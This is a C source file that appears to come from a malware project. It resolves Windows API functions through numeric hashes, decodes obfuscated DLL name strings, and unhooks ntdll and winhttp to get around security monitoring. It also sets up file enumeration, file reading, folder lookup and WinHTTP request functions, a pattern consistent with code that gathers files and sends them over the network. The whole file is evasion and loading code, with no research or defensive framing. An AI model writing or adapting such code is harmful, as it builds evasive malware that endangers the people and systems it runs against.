#include "external.h"
#include "import.h"
#include "util.h"
#include "strings.h"

void unhookingFunctions() {

	HMODULE kernel;

	if ((kernel = getModuleBase(1843107157)) == NULL)
		kernel = getModuleBase(1883303541);

	get_system_directory = (FUNC1)getFunctionAddress(kernel, 3863200886, 20284, 160);
	create_file = (FUNC2)getFunctionAddress(kernel, 3952526864, 39728, 112);
	create_file_mapping = (FUNC3)getFunctionAddress(kernel, 4081056924, 39728, 17);
	map_view_of_file = (FUNC4)getFunctionAddress(kernel, 299806899, 39728, 95);
	virtual_protect = (FUNC5)getFunctionAddress(kernel, 2219831693, 39728, 122);
	close_handle = (FUNC6)getFunctionAddress(kernel, 946915847, 39728, 233);
}


void loadFunctions() {

	HMODULE ntdll, winhttp, kernel, shell;
	WCHAR str_ntdll[] = { 0x4B, 0x40, 0x42, 0x68, 0x53, 0x74, 0x58, 0x3B, 0x36, 0x4F, 0x0C };     /*"\ntdll.dll" +11 */
	WCHAR str_winhttp[] = { 0x4B, 0x59, 0x5F, 0x62, 0x57, 0x6C, 0x02, 0x2F, 0x74, 0x47, 0x60, 0x4D, 0x2A };     /*"\winhttp.dll" +13 */
	WCHAR str_shell32[] = { 0x64, 0x46, 0x53, 0x60, 0x53, 0x2B, 0x44, 0x71, 0x3E, 0x4F, 0x60, 0x21 };     /*"shell32.dll" +12 */

	deobfuscateW(str_ntdll, 11);
	deobfuscateW(str_shell32, 12);
	unhookingFunctions();

	ntdll = unhookDll(getModuleBase(584300013), str_ntdll);
	rtl_init_unicode_string = (FUNC7)getFunctionAddress(ntdll, 699883401, 20284, 185);
	ldr_load_dll = (FUNC8)getFunctionAddress(ntdll, 50846499, 20284, 76);
	ldr_get_procedure_address = (FUNC9)getFunctionAddress(ntdll, 777689590, 22480, 237);
	nt_query_information_process = (FUNC10)getFunctionAddress(ntdll, 3493133410, 20284, 258);
	nt_set_information_thread = (FUNC11)getFunctionAddress(ntdll, 1411460657, 19776, 137);
	nt_create_file = (FUNC15)getFunctionAddress(ntdll, 363195611, 20284, 31);
	nt_close = (FUNC17)getFunctionAddress(ntdll, 2341344061, 20284, 126);
	nt_query_directory_file = (FUNC18)getFunctionAddress(ntdll, 2835693426, 22496, 210);
	nt_read_file = (FUNC19)getFunctionAddress(ntdll, 781687523, 22496, 55);

	if ((kernel = getModuleBase(1843107157)) == NULL) kernel = getModuleBase(1883303541);
	get_process_heap = (FUNC12)getFunctionAddress(kernel, 3327659266, 19776, 196);
	heap_alloc = (FUNC13)getFunctionAddress(kernel, 536700686, 20284, 45);
	heap_free = (FUNC14)getFunctionAddress(kernel, 927503301, 20284, 26);
	get_file_size = (FUNC20)getFunctionAddress(kernel, 2022819104, 22496, 149);

	shell = loadDll(str_shell32);
	sh_get_folder_path = (FUNC16)getFunctionAddress(shell, 2707220032, 22544, 98);

	winhttp = unhookDll(loadDll(str_winhttp + 1), str_winhttp);
	win_http_open = (FUNC21)getFunctionAddress(winhttp, 1582250469, 36780, 237);
	win_http_close_handle = (FUNC22)getFunctionAddress(winhttp, 908201173, 36780, 163);
	win_http_connect = (FUNC23)getFunctionAddress(winhttp, 1916977533, 36780, 114);
	win_http_open_request = (FUNC24)getFunctionAddress(winhttp, 3937909198, 36780, 201);
	win_http_send_request = (FUNC25)getFunctionAddress(winhttp, 2978216614, 36780, 86);
	win_http_receive_response = (FUNC26)getFunctionAddress(winhttp, 342640933, 36780, 70);
}